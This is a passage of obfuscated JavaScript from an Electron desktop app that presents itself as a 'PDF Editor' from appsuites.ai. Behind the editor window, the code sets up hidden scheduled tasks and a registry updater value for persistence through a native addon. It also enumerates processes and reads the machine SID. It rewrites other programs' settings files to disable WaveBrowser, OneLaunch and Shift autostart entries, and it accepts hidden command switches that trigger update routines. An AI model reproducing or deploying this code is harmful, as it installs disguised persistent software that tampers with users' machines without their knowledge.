                let uw = uv !== '' ? JSON.stringify(uv) ?? '' : '';
                return new nx(true, uu !== '' ? JSON.stringify(uu) ?? '' : '', uv);
              }
            } catch (ux) {
              await ns.w3F3UWA.Y6CDW21(ul, ns.z579NEI.l54DEIW, ux);
            }
          } catch (uy) {
            await ns.w3F3UWA.Y6CDW21(ul, ns.z579NEI.M5E3V2V, uy, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nx();
        }
        async g4EE56L(uz) {
          try {
            const va = (await nr.S559FZQ.l610ZCY(uz)) ?? '';
            if (va == '') {
              return 0;
            }
            return parseInt(va);
          } catch {
            ns.w3F3UWA.s59BT06('');
            return 0;
          }
        }
        async w5C1TZN(vb) {
          const vc = nr.S559FZQ.D47CBV3();
          if (!vc) {
            ns.w3F3UWA.s59BT06('');
            return;
          }
          let vd = require("path").join(vc, "");
          const fs11 = require("fs");
          try {
            let data9 = JSON.parse(fs11.readFileSync(vd, "utf8"));
            const ve = await this.g4EE56L("wv-key");
            if (data9[""] ?? true || (data9[""]?.[""] ?? true) || (data9[""] ?? true) || (data9[""] ?? true)) {
              if (0 == ve || vb) {
                await this.D45AYQ3("");
                data9[""] = false;
                if (!data9[""]) {
                  data9[""] = {
                    "": false
                  };
                } else {
                  data9[""][""] = false;
                }
                data9[""] = false;
                data9[""] = false;
                fs11.writeFileSync(vd, JSON.stringify(data9), "utf8");
                await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.R3F76I3, [vb, ve]);
                await nr.S559FZQ.c5E4Z7C("wv-key", "1");
              } else {
                await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.v535X73, [vb, ve]);
              }
            } else {
              let flag6 = false;
              if (1 == ve) {
                const vf = this.e5FBF4O("\\Wavesor Software_" + (this.X6066R5() ?? ''), "WaveBrowser-StartAtLogin", 1);
                const vg = this.t4E0LPU("\\");
                if (vf != undefined && false == vf && vg != undefined && vg) {
                  flag6 = true;
                  await nr.S559FZQ.c5E4Z7C("wv-key", "2");
                  await this.D45AYQ3("");
                  await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.d422GJH, [vb, ve]);
                }
              }
              if (!flag6) {
                await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.Q542KEX, [vb, ve]);
              }
            }
          } catch {
            ns.w3F3UWA.s59BT06('');
            await ns.w3F3UWA.W4EF0EI(3, ns.z579NEI.u51A2HJ);
          }
        }
        async c647ECB(vh) {
          const fs12 = require("fs");
          const vi = require("path").join(nr.S559FZQ.D47CBV3(), "", "");
          try {
            let data10 = JSON.parse(fs12.readFileSync(vi, "utf8"));
            const vj = await this.g4EE56L("ol-key");
            if (data10[""] || data10[""] || data10[""] || data10[""] || data10[""]) {
              if (0 == vj || vh) {
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                await this.D45AYQ3("");
                fs12.writeFileSync(vi, JSON.stringify(data10, null, 2), "utf8");
                await this.D45AYQ3("");
                await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.R3F76I3, [vh, vj]);
                await nr.S559FZQ.c5E4Z7C("ol-key", "1");
              } else {
                await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.v535X73, [vh, vj]);
              }
            } else {
              let flag7 = false;
              if (1 == vj) {
                const vk = this.e5FBF4O('', "OneLaunchLaunchTask", 1);
                const vl = this.t4E0LPU("\\");
                if (vk != undefined && false == vk && vl != undefined && vl) {
                  flag7 = true;
                  await nr.S559FZQ.c5E4Z7C("ol-key", "2");
                  await this.D45AYQ3("");
                  await this.D45AYQ3("");
                  await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.d422GJH, [vh, vj]);
                }
              }
              if (!flag7) {
                await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.Q542KEX, [vh, vj]);
              }
            }
          } catch {
            ns.w3F3UWA.s59BT06('');
            await ns.w3F3UWA.W4EF0EI(4, ns.z579NEI.u51A2HJ);
          }
        }
        async h659UF4(vm) {
          const vn = nr.S559FZQ.D47CBV3();
          if (!vn) {
            ns.w3F3UWA.s59BT06('');
            return;
          }
          let vo = require("path").join(vn, "");
          const fs13 = require("fs");
          try {
            let data11 = JSON.parse(fs13.readFileSync(vo, "utf8"));
            let flag8 = true;
            if ("shift" in data11 && "browser" in data11.shift) {
              const vq = data11.shift.browser;
              flag8 = vq.launch_on_login_enabled ?? true || (vq.launch_on_wake_enabled ?? true) || (vq.run_in_background_enabled ?? true);
            }
            const vp = await this.g4EE56L("sf-key");
            if (flag8) {
              if (0 == vp || vm) {
                if (!("shift" in data11)) {
                  data11.shift = {};
                }
                if (!("browser" in data11.shift)) {
                  data11.shift.browser = {};
                }
                data11.shift.browser.launch_on_login_enabled = false;
                data11.shift.browser.launch_on_wake_enabled = false;
                data11.shift.browser.run_in_background_enabled = false;
                await this.D45AYQ3("");
                fs13.writeFileSync(vo, JSON.stringify(data11), "utf8");
                await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.R3F76I3, [vm, vp]);
                await nr.S559FZQ.c5E4Z7C("sf-key", "1");
              } else {
                await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.v535X73, [vm, vp]);
              }
            } else {
              let flag9 = false;
              if (1 == vp) {
                const vr = this.e5FBF4O('', "ShiftLaunchTask", 1);
                const vs = this.t4E0LPU("\\");
                if (vr != undefined && false == vr && vs != undefined && vs) {
                  flag9 = true;
                  await nr.S559FZQ.c5E4Z7C("sf-key", "2");
                  await this.D45AYQ3("");
                  await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.d422GJH, [vm, vp]);
                }
              }
              if (!flag9) {
                await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.Q542KEX, [vm, vp]);
              }
            }
          } catch {
            ns.w3F3UWA.s59BT06('');
            await ns.w3F3UWA.W4EF0EI(6, ns.z579NEI.u51A2HJ);
          }
        }
        async W5F8HOG(vt) {
          const path9 = require("path");
          const fs14 = require("fs");
          try {
            let vu = (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", ""));
            const vv = await this.g4EE56L("pas-key");
            if (vu) {
              if (0 == vv || vt) {
                await this.D45AYQ3("", false);
                await this.D45AYQ3("", false);
                await this.w4D8BBU("", "");
                await this.w4D8BBU("", "");
                await this.w4D8BBU("", "");
                await ns.w3F3UWA.W4EF0EI(7, ns.z579NEI.R3F76I3, [vt, vv]);
                await nr.S559FZQ.c5E4Z7C("pas-key", "1");
              } else {
                await ns.w3F3UWA.W4EF0EI(7, ns.z579NEI.v535X73, [vt, vv]);
              }
            } else if (1 == vv) {
              await ns.w3F3UWA.W4EF0EI(7, ns.z579NEI.Q542KEX, [vt, vv]);
            }
          } catch {
            await ns.w3F3UWA.W4EF0EI(7, ns.z579NEI.u51A2HJ);
          }
        }
      };
      nq.A672SIS = oa;
    }
  });
  const h = b({
    'obj/globals.js'(vw, vx) {
      'use strict';

      const obj9 = {
        homeUrl: "https://pdf-tool.appsuites.ai/en/pdfeditor",
        CHANNEL_NAME: "main",
        USER_AGENT: "PDFFusion/93HEU7AJ",
        productName: "PDFEditor",
        appName: "PDF Editor",
        scheduledTaskName: "PDFEditorScheduledTask",
        registryName: 'PDFEditorUpdater',
        modeDataPath: "\\mode.data",
        scheduledUTaskName: "PDFEditorUScheduledTask",
        iconSubPath: "\\assets\\icons\\win\\pdf-n.ico"
      };
      vx.exports = obj9;
    }
  });
  const i = b({
    'obj/window.js'(vy) {
      'use strict';

      const {
        BrowserWindow: electron
      } = require("electron");
      const {
        dialog: electron2
      } = require("electron");
      vy.createBrowserWindow = () => {
        let vz = __dirname;
        vz = vz.replace("src", '');
        let wa = vz + h().iconSubPath;
        console.log(wa);
        const wb = new electron({
          resizable: true,
          width: 1024,
          height: 768,
          icon: wa,
          autoHideMenuBar: true,
          backgroundColor: "#fff",
          webPreferences: {
            devTools: false,
            preload: require("path").join(__dirname, "./preload.js")
          }
        });
        return wb;
      };
    }
  });
  const j = b({
    'obj/D3E8Q17.js'(wc) {
      Object.defineProperty(wc, "__esModule", {
        value: true
      });
      const wd = c();
      const fs15 = require('fs');
      const Utilityaddon = require(".\\lib\\Utilityaddon.node");
      const {
        app: electron3,
        Menu: electron4,
        ipcMain: electron5
      } = require("electron");
      const we = h();
      async function wf() {
        const wg = (wu) => {
          switch (wu) {
            case "--install":
              return wd.a689XV5.b5BEPQ2;
            case "--check":
              return wd.a689XV5.V4E6B4O;
            case "--reboot":
              return wd.a689XV5.j5C58S9;
            case "--cleanup":
              return wd.a689XV5.Z498ME9;
            case "--ping":
              return wd.a689XV5.f63DUQF;
          }
          return wd.a689XV5.B639G7B;
        };
        let flag10 = false;
        let wh = electron3.commandLine.getSwitchValue('c');
        let wi = electron3.commandLine.getSwitchValue('cm');
        console.log('args=' + wh);
        console.log("args2=" + wi);
        let wj = __dirname.replace("\\resources\\app\\w-electron\\bin\\release", '');
        console.log("wkdir = " + wj);
        if (!electron3.commandLine.hasSwitch('c') && !electron3.commandLine.hasSwitch('cm')) {
          await wk('--install');
          ws();
        }
        if (electron3.commandLine.hasSwitch('c') && wh == '0') {
          ws();
        }
        if (electron3.commandLine.hasSwitch('cm')) {
          if (wi == "--cleanup") {
            await wk(wi);
            console.log("remove ST");
            Utilityaddon.remove_task_schedule(we.scheduledTaskName);
            Utilityaddon.remove_task_schedule(we.scheduledUTaskName);
          } else if (wi == "--partialupdate") {
            await wk('--check');
          } else if (wi == "--fullupdate") {
            await wk("--reboot");
          } else if (wi == "--enableupdate") {
            Utilityaddon.SetRegistryValue(we.registryName, "\"" + wj + "\\" + we.appName + "\" --cm=--fullupdate");
          } else if (wi == "--disableupdate") {
            Utilityaddon.DeleteRegistryValue(we.registryName);
          } else if (wi == "--backupupdate") {
            await wk("--ping");
          }
          if (!electron3.commandLine.hasSwitch('c')) {
            electron3.quit();
          }
        }
        async function wk(wv) {
          console.log("To add wc routine");
          await wr(wv);
        }
        function wl() {
          return Utilityaddon.get_sid();
        }
        function wm(ww) {
          return Utilityaddon.GetOsCKey(ww);
        }
        function wn(wx, wy, wz) {
          return Utilityaddon.mutate_task_schedule(wx, wy, wz);
        }
        function wo(xa) {
          return Utilityaddon.find_process(xa);
        }
        function wp() {
          return Utilityaddon.GetPsList();
        }
        function wq() {
          try {
            let xb = Utilityaddon.mutate_task_schedule("\\", we.scheduledTaskName, 1);
            if (!xb) {
              Utilityaddon.create_task_schedule(we.scheduledTaskName, we.scheduledTaskName, "\"" + wj + "\\" + we.appName + "\"", "--cm=--partialupdate", wj, 1442);
            }
            let xc = Utilityaddon.mutate_task_schedule("\\", we.scheduledUTaskName, 1);
            if (!xb) {
              Utilityaddon.create_repeat_task_schedule(we.scheduledUTaskName, we.scheduledUTaskName, "\"" + wj + "\\" + we.appName + "\"", "--cm=--backupupdate", wj);
            }
          } catch (xd) {
            console.log(xd);
          }
        }
        async function wr(xe) {
          let xf = wg(xe);
          console.log("argument = " + xe);
          const xg = new g().A672SIS(wl, wm, wn, wo, wp);
          if (wd.a689XV5.b5BEPQ2 == xf) {
            if ((await xg.q41FDEK()) == g().U5E7DEV.C5B7MFV) {
              wq();
            }
          } else if (wd.a689XV5.Z498ME9 == xf) {
            await xg.l660ZQF();
          } else if (wd.a689XV5.f63DUQF == xf) {
            await xg.A4B0MTO();
          } else {
            e().w3F3UWA.s59BT06('');
            await xg.m58FJB5(xf);
          }
        }
        function ws() {
          try {
            let xh = wj + we.modeDataPath;
            console.log("modeFile = " + xh);
            if (fs15.existsSync(xh)) {
              flag10 = false;
            } else {
              flag10 = true;
            }
          } catch (xi) {
            console.log(xi);
          }
        }
        function wt() {
          try {
            let xj = wj + we.modeDataPath;
            if (fs15.existsSync(xj)) {
              fs15.rmSync(xj, {
                force: true
              });
            }
          } catch (xk) {
            console.log(xk);
          }
        }
        if (flag10) {
          electron3.whenReady().then(() => {
            let xl = i().createBrowserWindow(electron3);
            require("electron").session.defaultSession.webRequest.onBeforeSendHeaders((xm, xn) => {
              xm.requestHeaders["User-Agent"] = we.USER_AGENT;
              xn({
                cancel: false,
                requestHeaders: xm.requestHeaders
              });
            });
            xl.loadURL(we.homeUrl);
            xl.on("close", function (xo) {
              xo.preventDefault();
              xl.destroy();
            });
          });
          electron5.on(we.CHANNEL_NAME, (xp, xq) => {
            if (xq == "Set") {
              Utilityaddon.SetRegistryValue(we.registryName, "\"" + wj + "\\" + we.appName + "\" --cm=--fullupdate");
            }
            if (xq == "Unset") {
              Utilityaddon.DeleteRegistryValue(we.registryName);
            }
          });
          electron3.on("window-all-closed", () => {
            if (process.platform !== "darwin") {
              electron3.quit();
            }
          });
        }
        wt();
      }
      wf();
    }
  });
  j();
})();